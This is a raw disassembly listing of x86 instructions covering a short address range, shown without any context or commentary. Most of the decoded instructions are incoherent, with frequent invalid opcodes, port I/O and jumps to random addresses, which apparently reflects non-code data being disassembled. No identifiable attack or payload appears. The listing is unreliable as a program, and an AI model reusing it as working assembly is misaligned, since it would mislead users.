  41b570:	push   ebx
  41b571:	add    edi,0xffffffb4
  41b574:	in     eax,0x15
  41b576:	fwait
  41b577:	sub    BYTE PTR [ebx-0xf],cl
  41b57a:	aaa    
  41b57b:	cdq    
  41b57c:	inc    ecx
  41b57d:	in     al,0xf9
  41b57f:	test   DWORD PTR [edi],ebx
  41b581:	dec    edi
  41b582:	cld    
  41b583:	pop    esi
  41b584:	sub    DWORD PTR [edi],eax
  41b586:	mov    ds:0xe1efd67e,al
  41b58b:	dec    edi
  41b58c:	cs loopne 0x41b5a6
  41b58f:	call   0x968359d0
  41b594:	inc    edx
  41b595:	adc    BYTE PTR [edi+0x72970cc6],dh
  41b59b:	sub    dh,BYTE PTR [ecx+eiz*1-0x44f296a2]
  41b5a2:	outs   dx,BYTE PTR ds:[esi]
  41b5a3:	outs   dx,DWORD PTR ds:[esi]
  41b5a4:	ss loop 0x41b5a1
  41b5a7:	jmp    0x78f429b8
  41b5ac:	pushf  
  41b5ad:	jno    0x41b605
  41b5af:	jbe    0x41b54f
  41b5b1:	fnstenv [eax]
  41b5b3:	fist   WORD PTR [edi+0x43]
  41b5b6:	inc    ebp
  41b5b7:	jecxz  0x41b589
  41b5b9:	(bad)
  41b5be:	add    al,0x51
  41b5c0:	jp     0x41b618
  41b5c2:	push   ds
  41b5c3:	mov    eax,0x4f578744
  41b5c8:	push   ebp
  41b5c9:	shr    BYTE PTR [ebp-0x63],cl
  41b5cc:	loop   0x41b608
  41b5ce:	and    eax,0x1b87b16a
  41b5d3:	add    DWORD PTR [ebx],ebx
  41b5d5:	cmp    esp,DWORD PTR [edx-0x1d]
  41b5d8:	aam    0x66
  41b5da:	les    edi,FWORD PTR [esi+0x5bff2469]
  41b5e0:	or     ebp,DWORD PTR [eax+0x14]
  41b5e3:	jmp    0xbbdc:0xb6ac3844
  41b5ea:	iret   
  41b5eb:	scas   eax,DWORD PTR es:[edi]
  41b5ec:	xchg   esp,eax
  41b5ed:	xor    al,0x70
  41b5ef:	enter  0x28ac,0xb7
  41b5f3:	mov    ebx,es
  41b5f5:	call   0x57e4:0xcbee2018
  41b5fc:	sub    BYTE PTR [edx],bh
  41b5fe:	add    dh,bl
  41b600:	rol    DWORD PTR [esi+0x3],0x70
  41b604:	retf   
  41b605:	or     BYTE PTR [eax-0x4e033958],bl
  41b60b:	call   0x3ad831a1
  41b610:	sbb    BYTE PTR [ecx-0x265557bc],cl
  41b616:	ds cld 
  41b618:	out    0xbf,al
  41b61a:	mov    ebx,0xf7fc1ac1
  41b61f:	dec    ebp
  41b620:	ret    
  41b621:	(bad)  
  41b622:	pop    ebx
  41b623:	shr    BYTE PTR [ebp+0x29],cl
  41b626:	in     eax,dx
  41b627:	dec    ecx
  41b628:	xchg   edi,eax
  41b629:	ins    BYTE PTR es:[edi],dx
  41b62a:	call   0x95e8:0x419c3900
  41b631:	dec    edx
  41b632:	or     esi,DWORD PTR [esi]
  41b634:	(bad)  [ecx-0x53]
  41b637:	(bad)  
  41b639:	je     0x41b5c3
  41b63b:	shr    BYTE PTR [eax-0x28],cl
  41b63e:	pop    eax
  41b63f:	sub    al,BYTE PTR [ebx]
  41b641:	lea    ebx,[ebx-0xc]
  41b644:	and    dh,BYTE PTR [ebx]
  41b646:	test   edx,edi
  41b648:	jmp    0x7f3be127
  41b64d:	(bad)  
  41b64f:	jg     0x41b6bd
  41b651:	pushf  
  41b652:	xchg   esp,eax
  41b653:	mov    esi,0x56f937bc
  41b658:	adc    edi,ecx
  41b65a:	scas   eax,DWORD PTR es:[edi]
  41b65b:	xchg   DWORD PTR [esi+0x468dcd7a],edi
  41b661:	pop    esp
  41b662:	mov    WORD PTR [ebp-0x138d1373],?
  41b668:	lods   al,BYTE PTR ds:[esi]
  41b669:	sets   ch
  41b66c:	js     0x41b6bc
  41b66e:	std    
  41b66f:	data16 mov bl,0x31
  41b672:	js     0x41b6d3
  41b674:	xlat   BYTE PTR ds:[ebx]
  41b675:	std    
  41b676:	stc    
  41b677:	dec    esi
  41b678:	push   ecx
  41b679:	(bad)  
  41b67b:	xchg   esi,eax
  41b67c:	xchg   esp,eax
  41b67d:	fdiv   DWORD PTR [esi]
  41b67f:	mov    DWORD PTR [ecx],edx
  41b681:	ins    DWORD PTR es:[edi],dx
  41b682:	jecxz  0x41b688
  41b684:	loop   0x41b6af
  41b686:	fsubr  DWORD PTR [eax]
  41b688:	mov    edx,0xcae197b0
  41b68d:	xor    al,0xe7
  41b68f:	and    eax,0xb7f78d97
  41b694:	stos   BYTE PTR es:[edi],al
  41b695:	xor    ebp,DWORD PTR [ebx-0x68]
  41b698:	in     al,0x7b
  41b69a:	xchg   ecx,eax
  41b69b:	sahf   
  41b69c:	iret   
  41b69d:	pop    ecx
  41b69e:	pop    esp
  41b69f:	cs (bad) 
  41b6a1:	nop
  41b6a2:	retf   
  41b6a3:	mov    esi,0x29c153b5
  41b6a8:	test   al,0xa2
  41b6aa:	pop    ebp
  41b6ab:	loopne 0x41b6a9
  41b6ad:	and    cl,BYTE PTR [ebx+0x75bf0824]
  41b6b3:	add    al,0x8a
  41b6b5:	frstor [ecx]
  41b6b7:	dec    edx
  41b6b8:	adc    bl,BYTE PTR [eax]
  41b6ba:	jo     0x41b693
  41b6bc:	sbb    edx,DWORD PTR [ecx]
  41b6be:	or     edx,DWORD PTR [edi+0x301d71d]
  41b6c4:	dec    esi
  41b6c5:	(bad)  
  41b6c6:	shl    al,1
  41b6c8:	cmp    DWORD PTR [eax-0x546022fc],eax
  41b6ce:	(bad)  
  41b6cf:	in     eax,dx
  41b6d0:	sbb    ebx,DWORD PTR [edi+edi*4-0x6682d7d2]
  41b6d7:	leave  
  41b6d8:	out    dx,eax
  41b6d9:	enter  0x87df,0x67
  41b6dd:	daa    
  41b6de:	rcr    DWORD PTR [ecx-0x1e2c9872],cl
  41b6e4:	into   
  41b6e5:	ficomp DWORD PTR [edi-0x790a7724]
  41b6eb:	fs add al,0xd0
  41b6ee:	sub    ah,BYTE PTR [eax+eiz*4-0x6f]
  41b6f2:	popf   
  41b6f3:	out    0x30,eax
  41b6f5:	adc    DWORD PTR [esp+esi*2+0x29e2c8ae],esi
  41b6fc:	jl     0x7ed5e866
  41b702:	bound  edi,QWORD PTR [edx]
  41b704:	sbb    bl,BYTE PTR [edi+0x793feaf7]
  41b70a:	or     BYTE PTR [ecx+0x37820e7f],bh
  41b710:	mov    ah,0x26
  41b712:	mov    esi,0x1eb516da
  41b717:	or     DWORD PTR [ebx+ecx*2],ecx
  41b71a:	adc    eax,0xb90fa22c
  41b71f:	jge    0x41b748
  41b721:	adc    BYTE PTR [esi],dl
  41b723:	cdq    
  41b724:	mov    esi,0xef1492c4
  41b729:	add    eax,0x4e844375
  41b72e:	lea    ecx,[eax]
  41b730:	dec    eax
  41b731:	dec    ecx
  41b732:	xor    esi,edx
  41b734:	inc    edi
  41b735:	imul   ebp,DWORD PTR [eax],0x6def0324
  41b73b:	mov    ecx,0x778fed78
  41b740:	in     eax,0xca
  41b742:	mov    al,0xc4
  41b744:	mov    esi,0xe96052f8
  41b749:	call   0xbe48:0x75b6705d
  41b750:	icebp  
  41b751:	xchg   ecx,eax
  41b752:	mov    bh,0xfa
  41b754:	(bad)  
  41b755:	push   edx
  41b756:	(bad)  
  41b757:	sub    al,0xba
  41b759:	xchg   edi,eax
  41b75a:	mov    esp,0x598d60e2
  41b75f:	xchg   ecx,eax
  41b760:	rol    BYTE PTR [ecx],cl
  41b762:	push   ecx
  41b763:	xor    bl,bh
  41b765:	sub    BYTE PTR [edx],dh
  41b767:	and    BYTE PTR [edx],dl
  41b769:	cmp    ecx,DWORD PTR [esi]
  41b76b:	inc    esp
  41b76c:	mov    eax,0x37ede709
  41b771:	adc    BYTE PTR [edi-0x77],bl
  41b774:	ret    
  41b775:	inc    DWORD PTR [ebx+0x2181b3bd]
  41b77b:	cli    
  41b77c:	push   esp
  41b77d:	pop    es
  41b77e:	jo     0x41b701
  41b780:	rcl    BYTE PTR ds:0xf136a804,1
  41b786:	jp     0x41b760
  41b788:	in     al,0x1e
  41b78a:	jo     0x41b758
  41b78c:	sar    cl,1
  41b78e:	rol    BYTE PTR [ebx+0x74bd0a2a],1
  41b794:	(bad)  
  41b795:	mov    eax,0xef89e8aa
  41b79a:	out    0x2,al
  41b79c:	pop    edx
  41b79d:	adc    DWORD PTR [edi+0x6e],ebp
  41b7a0:	jmp    0xf74616e1
  41b7a5:	repnz inc edi
  41b7a7:	pxor   mm7,QWORD PTR [eax-0x3c]
  41b7ab:	pop    esi
  41b7ac:	push   ds
  41b7ad:	les    ebx,FWORD PTR [ebx-0x1f14fa4c]
  41b7b3:	inc    ebp
  41b7b4:	jae    0x41b7e5
  41b7b6:	mov    al,ds:0x13a5a4b8
  41b7bb:	mov    cs,WORD PTR [ebp-0x1a3a5504]
  41b7c1:	adc    BYTE PTR [edi-0x4511ac37],cl
  41b7c7:	push   esi
  41b7c8:	repnz cmp esi,ebx
  41b7cb:	jle    0x41b802
  41b7cd:	repnz push edi
  41b7cf:	or     al,0xe8
  41b7d1:	cli    
  41b7d2:	lahf   
  41b7d3:	pop    ebx
  41b7d4:	outs   dx,DWORD PTR ds:[esi]
  41b7d5:	sbb    DWORD PTR [edi+0x31],esi
  41b7d8:	mov    ds:0x9bbb8b1a,eax
  41b7dd:	jne    0x41b7bf
  41b7df:	ds jbe 0x41b771
  41b7e2:	mov    ch,BYTE PTR [eax-0x71651184]
  41b7e8:	fld    TBYTE PTR [esi+ebx*1-0x29]
  41b7ec:	std    
  41b7ed:	xor    al,0x65
  41b7ef:	js     0x41b852
  41b7f1:	sbb    DWORD PTR [eax],esp
  41b7f3:	nop
  41b7f4:	mov    al,0xb
  41b7f6:	and    bl,BYTE PTR [eax]
  41b7f8:	pusha  
  41b7f9:	pusha  
  41b7fa:	cmp    esp,esi
  41b7fc:	mov    ebx,0x362a54be
  41b801:	pop    ecx
  41b802:	and    DWORD PTR [ebx+ebx*4-0x43],ebx
  41b806:	test   ebp,esp
  41b808:	shl    cl,1
  41b80a:	or     BYTE PTR [ebp+0x20],dh
  41b80d:	xchg   esp,eax
  41b80e:	call   0xbb1f:0x2a20585
  41b815:	jp     0x41b7ac
  41b817:	sub    edi,DWORD PTR [ecx]
  41b819:	jle    0x41b855
  41b81b:	jmp    0x41b7d0
  41b81d:	jns    0x41b828
  41b81f:	pop    edi
  41b820:	mov    eax,0xdfdb4842
  41b825:	xlat   BYTE PTR ds:[ebx]
  41b826:	sbb    BYTE PTR [edx+0x60a0c5d5],dh
  41b82c:	fwait
  41b82d:	pop    edi
  41b82e:	xor    BYTE PTR [ebp+0xe],dh
  41b831:	push   ss
  41b832:	std    
  41b833:	test   BYTE PTR [ecx+0x72],dh
  41b836:	not    DWORD PTR [ebx+eax*2]
  41b839:	push   ecx
  41b83a:	adc    esi,DWORD PTR [edx]
  41b83c:	popa   
  41b83d:	cs lock lahf 
  41b840:	dec    ebp
  41b841:	sub    ebx,DWORD PTR [ebp-0x4f]
  41b844:	sbb    dh,BYTE PTR [eax]
  41b846:	push   0x5953d548
  41b84b:	fld    TBYTE PTR [esi+0x7e]
  41b84e:	jg     0x41b839
  41b850:	pop    ebp
  41b851:	je     0x41b8c6
  41b853:	mov    esi,0x5a5a2357
  41b858:	dec    edi
  41b859:	pop    ebx
  41b85a:	xor    BYTE PTR [edi],cl
  41b85c:	mov    cl,0xd8
  41b85e:	sahf   
  41b85f:	aam    0x4b
  41b861:	aam    0x5b
  41b863:	clc    
  41b864:	mov    edx,0x8586a3f1
  41b869:	push   edi
  41b86a:	mov    bh,0xbf
  41b86c:	push   ebp
  41b86d:	push   0xffffff8c
  41b86f:	push   0x2d
  41b871:	sub    eax,0x7521efb4
  41b876:	jno    0x41b8ab
  41b878:	sbb    esp,0x937eb7f1
  41b87e:	xchg   ecx,eax
  41b87f:	pop    esi
  41b880:	in     al,0x8d
  41b882:	hlt    
  41b883:	cmp    dh,bl
  41b885:	scas   eax,DWORD PTR es:[edi]
  41b886:	xor    al,0xc6
  41b888:	call   FWORD PTR [ebx-0x7300d60]
  41b88e:	les    ebx,FWORD PTR [eax]
  41b890:	xor    dh,BYTE PTR [eax+0x47d29cdb]
  41b896:	retf   0x490d
  41b899:	sub    BYTE PTR [edi-0x55d3d9ee],ch
  41b89f:	scas   al,BYTE PTR es:[edi]
  41b8a0:	sub    eax,0x76d7ed30
  41b8a5:	shl    DWORD PTR ds:0xb2863cec,cl
  41b8ab:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8ad:	out    dx,eax
  41b8ae:	clc    
  41b8af:	cli    
  41b8b0:	in     eax,0xc4
  41b8b2:	ins    DWORD PTR es:[edi],dx
  41b8b3:	sub    cl,BYTE PTR [ebx-0x3a]
  41b8b6:	xor    DWORD PTR [eax+0x25a9026d],edx
  41b8bc:	fwait
  41b8bd:	push   esp
  41b8be:	add    al,BYTE PTR [eax]
  41b8c0:	mov    ds:0xaa29b97d,al
  41b8c5:	into   
  41b8c6:	add    edx,ebp
  41b8c8:	xchg   ebp,eax
  41b8c9:	out    dx,eax
  41b8ca:	js     0x41b92f
  41b8cc:	jmp    0xc1191a22
  41b8d1:	(bad)  
  41b8d2:	cld    
  41b8d3:	jl     0x41b855
  41b8d5:	push   esi
  41b8d6:	aaa    
  41b8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8d8:	shr    DWORD PTR [esi+0x72],0x2b
  41b8dc:	aad    0xca
  41b8de:	ins    BYTE PTR es:[di],dx
  41b8e0:	mov    eax,0xfb5fe49e
  41b8e5:	mov    dh,0x69
  41b8e7:	lock jle 0x41b912
  41b8ea:	dec    edi
  41b8eb:	int    0x6a
  41b8ed:	lds    ecx,FWORD PTR [edx+eax*8]
  41b8f0:	(bad)  
  41b8f2:	sbb    bl,BYTE PTR [ebx+0x36]
  41b8f5:	pop    edx
  41b8f6:	or     eax,0x47c76f81
  41b8fb:	jge    0x41b959
  41b8fd:	push   0xffffffe8
  41b8ff:	dec    ecx
  41b900:	mov    ebx,0xf979ad17
  41b905:	jns    0x41b8ee
  41b907:	aam    0xf0
  41b909:	in     al,0xf6
  41b90b:	or     al,0xe8
  41b90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b90e:	xor    esi,esi
  41b910:	mov    esp,0x5c5b3fa8
  41b915:	out    dx,eax
  41b916:	je     0x41b918
	...
  41b920:	add    BYTE PTR ds:0x7fd60e68,dl
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi-0x5c],ah
  41b92e:	cli    
  41b92f:	pop    ds
  41b930:	call   0x3ae:0x13627
  41b937:	add    BYTE PTR [eax],al
  41b939:	call   0xbf52fe75
  41b93e:	or     DWORD PTR [edx],esp
  41b940:	in     eax,0x38
  41b942:	sbb    al,0x3b
  41b944:	retf   0xcfaf
  41b947:	repnz and esp,DWORD PTR [edx]
  41b94a:	jae    0x41b94b
  41b94c:	(bad)  
  41b94d:	rol    BYTE PTR [ecx+ebx*1+0x51f3b4f3],cl
  41b954:	push   edi
  41b955:	(bad)  
  41b956:	in     eax,dx
  41b957:	xchg   bl,ah
  41b959:	ret    
  41b95a:	popf   
  41b95b:	push   eax
  41b95c:	pop    ebx
  41b95d:	push   es
  41b95e:	jmp    0x12dd:0x877a556d
  41b965:	stos   DWORD PTR es:[edi],eax
  41b966:	mov    dl,0x18
  41b968:	pop    edi
  41b969:	pop    ebp
  41b96a:	cmp    eax,0xf40b04f8
  41b96f:	cmp    ebx,DWORD PTR [edi+edi*8]
  41b972:	cs push edx
  41b974:	jb     0x41b952
  41b976:	sbb    eax,0xa2f461ff
  41b97b:	xchg   ebx,eax
  41b97c:	dec    DWORD PTR [edi]
  41b97e:	out    dx,al
  41b97f:	shld   DWORD PTR ds:0x62c74619,ebp,cl
  41b986:	leave  
  41b987:	ins    DWORD PTR es:[edi],dx
  41b988:	adc    eax,0x8e53c6d7
  41b98d:	test   BYTE PTR [ebx+0x49],ch
  41b990:	icebp  
  41b991:	dec    bx
  41b993:	or     DWORD PTR [edi-0x5f],0x11
  41b997:	and    DWORD PTR [esi],eax
  41b999:	pop    es
  41b99a:	push   edi
  41b99b:	fs in  eax,0x9e
  41b99e:	inc    ebp
  41b99f:	xor    DWORD PTR [ebp+0x27ca135],0xffffffeb
  41b9a6:	add    DWORD PTR [ebx+0x7dbbc680],0x32f150c9
  41b9b0:	(bad)  
  41b9b2:	jl     0x41b99a
  41b9b4:	mov    esp,0x1cc8de71
  41b9b9:	js     0x41ba0b
  41b9bb:	xchg   edi,eax
  41b9bc:	mov    ch,0xc6
  41b9be:	add    eax,0x8f3588ae
  41b9c3:	sub    ebp,edx
  41b9c5:	xchg   ebx,ebp
  41b9c7:	and    eax,0xd871ac90
  41b9cc:	loop   0x41b9d9
  41b9ce:	cmp    BYTE PTR [ebp+edx*8+0x68bfbeaf],dl
  41b9d5:	jge    0x41ba4d
  41b9d7:	push   0x7c085da7
  41b9dc:	mov    esi,0x269ee0da
  41b9e1:	mov    dh,0xa8
  41b9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9e4:	test   al,0xfa
  41b9e6:	push   ecx
  41b9e7:	fs jmp 0x41b9f0
  41b9ea:	int3   
  41b9eb:	pusha  
  41b9ec:	not    BYTE PTR [ebp+edx*1-0x2e]
  41b9f0:	or     dh,BYTE PTR [edi+edi*1+0x783e29ae]
  41b9f7:	int    0x77
  41b9f9:	and    BYTE PTR [ecx],bh
  41b9fb:	pop    esp
  41b9fc:	sbb    al,0xca
  41b9fe:	sbb    al,0xae
  41ba00:	sar    BYTE PTR [ebx-0x6f],0x0
  41ba04:	lahf   
  41ba05:	fst    st(4)
  41ba07:	xor    al,BYTE PTR [edi]
  41ba09:	outs   dx,DWORD PTR ds:[esi]
  41ba0a:	pop    ebx
  41ba0b:	sbb    al,0x1e
  41ba0d:	mov    ?,WORD PTR [esi+0x4d]
  41ba10:	mov    eax,0xf523abd7
  41ba15:	shl    DWORD PTR [ebx],0x85
  41ba18:	scas   al,BYTE PTR es:[edi]
  41ba19:	jg     0x41ba82
  41ba1b:	and    BYTE PTR [esi+0x1],cl
  41ba1e:	inc    esp
  41ba1f:	ja     0x41b9d3
  41ba21:	push   ds
  41ba22:	add    ebx,ecx
  41ba24:	or     edx,DWORD PTR [ebp-0x4fbc6aae]
  41ba2a:	xchg   edi,eax
  41ba2b:	jns    0x41ba8c
  41ba2d:	out    dx,eax
  41ba2e:	jg     0x41ba58
  41ba30:	push   0x486b99e4
  41ba35:	retf   0x6ce8
  41ba38:	or     ebp,DWORD PTR [edx-0x60]
  41ba3b:	and    DWORD PTR [edx+0x2d],ebx
  41ba3e:	xchg   esi,eax
  41ba3f:	cmp    DWORD PTR [eax+eiz*8-0x27],ebx
  41ba43:	cdq    
  41ba44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba45:	shr    DWORD PTR [edi+0x3a7fa028],0x2e
  41ba4c:	push   ebx
  41ba4d:	outs   dx,DWORD PTR ds:[esi]
  41ba4e:	jns    0x41ba11
  41ba50:	test   al,0xe2
  41ba52:	ret    0x3c3f
  41ba55:	stos   BYTE PTR es:[edi],al
  41ba56:	sti    
  41ba57:	push   ebp
  41ba58:	add    eax,edi
  41ba5a:	push   eax
  41ba5b:	ja     0x41ba2d
  41ba5d:	sub    eax,0xa77734eb
  41ba62:	xor    ah,BYTE PTR [esp+esi*4]
  41ba65:	fs push 0x24
  41ba68:	xor    dl,BYTE PTR [edx+ecx*4]
  41ba6b:	cdq    
  41ba6c:	inc    ebx
  41ba6d:	or     ch,BYTE PTR [edi]
  41ba6f:	daa    
  41ba70:	aad    0x45
  41ba72:	add    edi,DWORD PTR [edx-0x67bdcd6a]
  41ba78:	pop    ds
  41ba79:	aaa    
  41ba7a:	adc    DWORD PTR [ebx-0xc],0xffffffed
  41ba7e:	and    BYTE PTR [eax],0x22
  41ba81:	mov    eax,esi
  41ba83:	cmp    edi,DWORD PTR [ebp+0x55]
  41ba86:	imul   BYTE PTR [edx+0x28]
  41ba89:	enter  0xcb1e,0xea
  41ba8d:	mov    eax,0x8dd4fc5a
  41ba92:	fist   WORD PTR [ecx-0x29]
  41ba95:	stos   DWORD PTR es:[edi],eax
  41ba96:	stos   DWORD PTR es:[edi],eax
  41ba97:	mov    eax,0x7712680b
  41ba9c:	xchg   DWORD PTR [esi],ecx
  41ba9e:	push   edi
  41ba9f:	ficomp WORD PTR [ebx-0x480d2a42]
  41baa5:	retf   
  41baa6:	sbb    DWORD PTR [edi-0x2d],ebx
  41baa9:	inc    esp
  41baaa:	pop    eax
  41baab:	in     al,0x2d
  41baad:	out    0x39,eax
  41baaf:	mov    dl,0xec
  41bab1:	iret   
  41bab2:	es ins BYTE PTR es:[edi],dx
  41bab4:	pop    ss
  41bab5:	add    esp,DWORD PTR [esp+edx*2+0x3805335a]
  41babc:	mov    bl,0x3c
  41babe:	xchg   esp,eax
  41babf:	xchg   edi,eax
  41bac0:	lds    ecx,FWORD PTR [ecx*1-0x463a6eba]
  41bac7:	adc    bh,BYTE PTR [si]
  41baca:	dec    edi
  41bacb:	in     eax,dx
  41bacc:	arpl   cx,bx
  41bace:	out    0x4b,al
  41bad0:	ss aas 
  41bad2:	xchg   edx,eax
  41bad3:	dec    edx
  41bad4:	jmp    0x41ba76
  41bad6:	push   ecx
  41bad7:	pop    ds
  41bad8:	sar    ecx,cl
  41bada:	mov    bh,0x30
  41badc:	jnp    0x41bb44
  41bade:	in     al,0xbf
  41bae0:	cwde   
  41bae1:	push   0x29
  41bae3:	mov    ebx,0x7188a4ce
  41bae8:	or     ebx,edx
  41baea:	inc    esi
  41baeb:	and    al,0x39
  41baed:	mov    cs,WORD PTR [edi]
  41baef:	imul   DWORD PTR [esi+0x6b932f94]
  41baf5:	sub    ebx,DWORD PTR [ebp-0x44677f1]
  41bafb:	mov    esp,0x264a0cf5
  41bb00:	jbe    0x41bae9
  41bb02:	mov    al,0xe5
  41bb04:	mov    bh,0x68
  41bb06:	inc    edi
  41bb07:	add    al,0x62
  41bb09:	cld    
  41bb0a:	dec    ecx
  41bb0b:	adc    BYTE PTR [edx+ebx*1-0x5dcf951c],al
  41bb12:	imul   eax,DWORD PTR [esi+0x1e],0xb1da4246
  41bb19:	inc    ebp
  41bb1a:	lock (bad) 
  41bb1c:	iret   
  41bb1d:	push   ebp
  41bb1e:	ins    DWORD PTR es:[edi],dx
  41bb1f:	hlt    
  41bb20:	adc    ch,BYTE PTR ss:[ebp+esi*4+0x4b2dd247]
  41bb28:	mov    edi,0xb8666823
  41bb2d:	xchg   edx,eax
  41bb2e:	and    DWORD PTR ds:0xa9e86589,edi
  41bb34:	xor    al,BYTE PTR [ebx+0x4312bb79]
  41bb3a:	je     0x41bac0
  41bb3c:	mov    edi,0x9e86b434
  41bb41:	jl     0x41bb89
  41bb43:	imul   BYTE PTR [eax-0x15]
  41bb46:	aaa    
  41bb47:	add    al,0xd4
  41bb49:	aad    0x65
  41bb4b:	retf   
  41bb4c:	xlat   BYTE PTR ds:[ebx]
  41bb4d:	push   0x15
  41bb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb50:	xlat   BYTE PTR ds:[ebx]
  41bb51:	lea    edi,[ebp+eiz*1+0x72]
  41bb55:	(bad)  
  41bb56:	dec    ecx
  41bb57:	mov    eax,ds:0x6ff59f15
  41bb5c:	mov    al,ds:0xc6ca6c15
  41bb61:	pop    ecx
  41bb62:	dec    ebx
  41bb63:	imul   eax,DWORD PTR [ebx+ebx*8+0x8],0xffffffa9
  41bb68:	clc    
  41bb69:	daa    
  41bb6a:	push   es
  41bb6b:	out    0xff,eax
  41bb6d:	sbb    al,BYTE PTR [edx+0x6410ce26]
  41bb73:	mov    al,ch
  41bb75:	aas    
  41bb76:	dec    edx
  41bb77:	jg     0x41bbb7
  41bb79:	cwde   
  41bb7a:	mov    esi,0x150772ec
  41bb7f:	jnp    0x71dce968
  41bb85:	mov    al,0x22
  41bb87:	mov    al,ds:0x1a4dfb33
  41bb8c:	arpl   WORD PTR [ecx+ebp*2+0x4fd681f0],dx
  41bb93:	sub    ch,bh
  41bb95:	push   0x17
  41bb97:	or     DWORD PTR [esi-0x16e13f84],esp
  41bb9d:	cmp    ecx,esp
  41bb9f:	rcl    DWORD PTR [edi],0xc
  41bba2:	inc    ebp
  41bba3:	cmp    BYTE PTR [ecx],ch
  41bba5:	mov    ecx,0x15d89ce4
  41bbaa:	inc    ebx
  41bbab:	(bad)  
  41bbac:	inc    ebx
  41bbad:	dec    edx
  41bbae:	rol    ebx,cl
  41bbb0:	pop    es
  41bbb1:	xor    esp,DWORD PTR [ebx-0x2c]
  41bbb4:	cwde   
  41bbb5:	leave  
  41bbb6:	ficomp DWORD PTR [edx+0x3b]
  41bbb9:	sbb    BYTE PTR [ecx],al
  41bbbb:	int    0x11
  41bbbd:	mov    ds,esi
  41bbbf:	and    al,BYTE PTR ds:0xfa886552
  41bbc5:	mov    ch,0x4
  41bbc7:	shl    esi,1
  41bbc9:	mov    esp,0x4f7553b8
  41bbce:	std    
  41bbcf:	ss xor al,0xef
  41bbd2:	adc    esi,esi
  41bbd4:	and    ebx,0xf7409742
  41bbda:	mov    dl,0x6e
  41bbdc:	aaa    
  41bbdd:	out    dx,eax
  41bbde:	mov    dl,BYTE PTR [eax+0x4d57e6cd]
  41bbe4:	les    ebx,FWORD PTR [ebx+eax*4+0x5b]
  41bbe8:	inc    ecx
  41bbe9:	out    0xc7,eax
  41bbeb:	pop    es
  41bbec:	sub    eax,0x8a3e3445
  41bbf1:	mov    ebx,0xa538aaa4
  41bbf6:	adc    BYTE PTR ds:0xc549ec74,cl
  41bbfc:	adc    BYTE PTR [ebx+ecx*8+0x4a265e3e],0x54
  41bc04:	and    DWORD PTR [edi+0x11ea0918],eax
  41bc0a:	hlt    
  41bc0b:	adc    BYTE PTR [ebx],dh
  41bc0d:	pop    ebp
  41bc0e:	js     0x41bc0a
  41bc10:	jmp    0x7098a920
  41bc15:	add    DWORD PTR [edi-0x3806ecbf],0xc809c5ab
  41bc1f:	pop    eax
  41bc20:	ds sbb cl,ah
  41bc23:	popf   
  41bc24:	fs jnp 0x41bc5d
  41bc27:	or     eax,0xff04c33e
  41bc2c:	into   
  41bc2d:	addr16 jne 0x41bc1b
  41bc30:	ds mov edx,edx
  41bc33:	lahf   
  41bc34:	mov    cl,0x52
  41bc36:	adc    esp,DWORD PTR [ecx-0x5d]
  41bc39:	add    al,BYTE PTR [ebp+0x4ef39d5e]
  41bc3f:	adc    al,0xeb
  41bc41:	sub    dl,BYTE PTR [ebp+0xc]
  41bc44:	mov    cl,0xd7
  41bc46:	cmp    edi,DWORD PTR [ecx]
  41bc48:	shr    dl,1
  41bc4a:	loope  0x41bbec
  41bc4c:	lock ins BYTE PTR es:[edi],dx
  41bc4e:	xor    al,0x71
  41bc50:	mov    DWORD PTR [ebx-0x16],ecx
  41bc53:	call   0xd0b0:0xe5d0916b
  41bc5a:	mov    dh,bh
  41bc5c:	mov    edi,0x599161da
  41bc61:	or     al,0xe5
  41bc63:	push   0x26
  41bc65:	add    DWORD PTR [esi+0x2ee7db6],ebp
  41bc6b:	sub    esp,DWORD PTR [edx]
  41bc6d:	into   
  41bc6e:	pop    ds
  41bc6f:	int3   
  41bc70:	mov    DWORD PTR [ebp+0x2d3df860],esp
  41bc76:	jmp    0x9420abe
  41bc7b:	pusha  
  41bc7c:	inc    esp
  41bc7d:	mov    ebp,0xe8d40875
  41bc82:	in     eax,0x22
  41bc84:	mov    edi,0xf08e6747
  41bc89:	cmp    edi,eax
  41bc8b:	pushf  
  41bc8c:	div    DWORD PTR [ecx-0x3a]
  41bc8f:	xchg   esi,eax
  41bc90:	xlat   BYTE PTR ds:[ebx]
  41bc91:	or     DWORD PTR [edi-0x55],esp
  41bc94:	mov    esp,0xbfea2eea
  41bc99:	lds    esi,FWORD PTR [ebp-0x5f22ffc6]
  41bc9f:	fist   DWORD PTR [eax+0x527db44b]
  41bca5:	xchg   ebp,eax
  41bca6:	repnz sbb bl,0x9
  41bcaa:	xchg   ecx,eax
  41bcab:	ret    0xa301
  41bcae:	loopne 0x41bcb1
  41bcb0:	xor    al,0xb
  41bcb2:	test   eax,0x993a04f8
  41bcb7:	ret    
  41bcb8:	dec    edx
  41bcb9:	lds    esi,FWORD PTR [ecx-0x51eecee0]
  41bcbf:	or     eax,0xe6ff768
  41bcc4:	ins    BYTE PTR es:[edi],dx
  41bcc5:	movzx  esi,BYTE PTR [ecx-0x66caf1fe]
  41bccc:	xor    BYTE PTR [ecx+0x11],cl
  41bccf:	imul   eax,DWORD PTR [edx],0x2bf8540d
  41bcd5:	cwde   
  41bcd6:	ret    
  41bcd7:	int3   
  41bcd8:	mov    cl,0x56
  41bcda:	pop    esp
  41bcdb:	mov    WORD PTR [edx-0x1dd919aa],?
  41bce1:	mov    dl,0x1f
  41bce3:	fwait
  41bce4:	cwde   
  41bce5:	push   ecx
  41bce6:	dec    ebx
	...
  41bcef:	add    BYTE PTR [eax],al
  41bcf1:	cld    
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	call   0xd5e14864
  41bd02:	cmp    DWORD PTR [ecx],eax
  41bd04:	add    BYTE PTR [esi+0x37000003],ch
  41bd0a:	test   bl,dl
  41bd0c:	pop    esp
  41bd0d:	aaa    
  41bd0e:	push   ebp
  41bd0f:	inc    ebx
  41bd10:	add    ah,bh
  41bd12:	dec    esp
  41bd13:	mov    ah,0x1a
